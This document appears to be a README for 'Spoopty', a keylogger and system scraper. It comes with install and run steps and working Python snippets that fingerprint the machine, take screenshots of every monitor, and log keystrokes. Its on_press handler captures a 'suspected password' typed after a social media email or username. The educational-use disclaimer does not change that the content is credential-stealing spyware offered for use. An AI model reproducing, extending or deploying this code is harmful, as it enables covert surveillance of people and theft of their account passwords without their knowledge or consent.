# Spoopty Keylogger and System Scraper

## Description

Spoopty is a keylogger and system monitor that logs keyboard inputs, mouse movements, mouse clicks, and mouse scrolls along with the corresponding window information, process names, and URLs. It also captures screenshots when specific events occur, such as pressing the Enter key or clicking the left mouse button. The script is designed to work on Windows, macOS, and Linux operating systems.

## Variable Definitions

- `os_name`: The name of the operating system (e.g., Windows, Darwin, Linux).
- `current_datetime`: The current date and time formatted as "YYYY-MM-DD_HH-MM-SS".
- `log_file`: The path to the log file where the captured information will be stored.
- `active_window`: The currently active window information.
- `active_url`: The URL of the currently active window.
- `suspected_password`: The suspected password captured during the password entry process.
- `password_entry_started`: A flag indicating whether the password entry process has started.

## Installation

1. Clone the repository or download the script file.
2. Install the required dependencies by running the following command:
   ```
   pip install -r requirements.txt
   ```

## Architecture Overview

The script consists of the following main components:

1. **Logging Configuration**: The script configures the logging system to store the captured information in a log file named `Logs/{os_name}_{current_datetime}.log`.

2. **Machine Information**: The script retrieves various machine information such as operating system details, network type, user account, drive mappings, and more. This information is logged at the start of the script.

3. **Webpage Source Retrieval**: The script provides functions to retrieve the source code of a webpage using either the `requests` library or platform-specific methods.

4. **Input Name Extraction**: The script analyzes the webpage source to extract the names of input fields and buttons based on the cursor position.

5. **Screenshot Capture**: The script captures screenshots of each monitor when specific events occur, such as pressing the Enter key or clicking the left mouse button. The screenshots are saved in the "Screen Captures" directory.

6. **Social Media URL Detection**: The script checks if a URL belongs to a social media platform based on a predefined list of social media URLs.

7. **Keyboard and Mouse Monitoring**: The script uses the `pynput` library to monitor keyboard and mouse events. It logs the captured information along with the corresponding window information, process names, and URLs.

## Usage Examples

1. Run the script using the following command:
   ```
   python spoopty.py
   ```

2. The script will start monitoring keyboard and mouse events and capturing relevant information.

3. The captured information will be logged in the `Logs/{os_name}_{current_datetime}.log` file.

4. Screenshots will be captured when specific events occur and saved in the "Screen Captures" directory.

5. To stop the script, press `Ctrl+C` in the terminal or command prompt.

## Function Descriptions

- `get_machine_info()`: Retrieves various machine information such as operating system details, network type, user account, drive mappings, and more.
- `log_machine_info()`: Logs the machine information at the start of the script.
- `get_webpage_source(url)`: Retrieves the source code of a webpage using either the `requests` library or platform-specific methods.
- `get_input_name(url, x, y)`: Analyzes the webpage source to extract the name of an input field or button based on the cursor position.
- `get_window_info()`: Retrieves information about the currently active window (not available on all operating systems).
- `take_screenshot(process_name)`: Captures screenshots of each monitor and saves them in the "Screen Captures" directory.
- `is_social_media_url(url)`: Checks if a URL belongs to a social media platform based on a predefined list of social media URLs.
- `extract_social_media_info(text)`: Extracts email addresses and social media usernames from the provided text using regular expressions.
- `on_press(key)`: Callback function triggered when a key is pressed.
- `on_release(key)`: Callback function triggered when a key is released.
- `on_move(x, y)`: Callback function triggered when the mouse is moved.
- `on_click(x, y, button, pressed)`: Callback function triggered when a mouse button is clicked.
- `on_scroll(x, y, dx, dy)`: Callback function triggered when the mouse is scrolled.

## Legal and Ethical Disclaimer

This script is provided for educational and informational purposes only. The use of keyloggers and monitoring tools may be subject to legal restrictions and ethical considerations. It is the responsibility of the user to ensure compliance with all applicable laws and regulations and to obtain proper authorization before using this script.

The authors and contributors of this script are not liable for any misuse, damage, or legal consequences arising from the use of this script. By using this script, you acknowledge and agree that you are solely responsible for your actions and any consequences that may result from using this script.

Please use this script responsibly and respect the privacy and rights of others.

## Code Snippets

Here are a few relevant code snippets from the script:

1. Logging configuration:
   ```python
   log_file = f'Logs/{os_name}_{current_datetime}.log'
   logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
   ```

2. Retrieving machine information:
   ```python
   def get_machine_info():
       info = []
       info.append(f"Operating System: {platform.system()} {platform.release()}")

       if psutil:
           info.append(f"Network Type: {psutil.net_if_stats()}")
           info.append(f"User Account: {psutil.users()[0].name}")
           info.append(f"User Access Level: {psutil.Process().username()}")
           info.append(f"Drive Mappings: {psutil.disk_partitions()}")
           info.append(f"Drive Names: {[i.mountpoint for i in psutil.disk_partitions()]}")

       info.append(f"Domain: {socket.getfqdn()}")
       info.append(f"IPv4: {socket.gethostbyname(socket.gethostname())}")
       info.append(f"MAC Address: {':'.join(c + d for c, d in zip(*[iter(hex(uuid.getnode())[2:].zfill(12))]*2))}")

       return '\n'.join(info)
   ```

3. Capturing screenshots:
   ```python
   def take_screenshot(process_name):
       timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
       screenshot_dir = "Screen Captures"
       os.makedirs(screenshot_dir, exist_ok=True)
       
       if mss:
           with mss.mss() as sct:
               for i, monitor in enumerate(sct.monitors[1:], start=1):
                   screenshot_name = f"{screenshot_dir}/{timestamp}_{process_name}_monitor{i}.png"
                   sct.shot(mon=monitor, output=screenshot_name)
   ```

4. Keyboard and mouse monitoring:
   ```python
   def on_press(key):
       global active_window, active_url, suspected_password, password_entry_started
       
       window_info = get_window_info()
       process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
       log_entry = f'Key pressed: {key} - Process: {process_name} - Window Info: {window_info}'

       if isinstance(key, keyboard.KeyCode):
           emails, usernames = extract_social_media_info(key.char)
           if emails:
               log_entry += f' - Social Media Email(s): {", ".join(emails)}'
               active_window = window_info
               active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
               password_entry_started = True
               suspected_password = ''
           if usernames:
               log_entry += f' - Social Media Username(s): {", ".join(usernames)}'
               active_window = window_info
               active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
               password_entry_started = True
               suspected_password = ''
           
           if password_entry_started:
               if key == keyboard.Key.enter:
                   log_entry += f' - Suspected Password: [{suspected_password}]'
                   password_entry_started = False
               elif key == keyboard.Key.backspace:
                   suspected_password = suspected_password[:-1]
               else:
                   suspected_password += key.char
       
       log_entry = f'[Keyboard Input] {log_entry}'
       logging.info(log_entry)

       if key == keyboard.Key.enter:
           take_screenshot(process_name)
   ```

Please refer to the script file for the complete code and implementation details.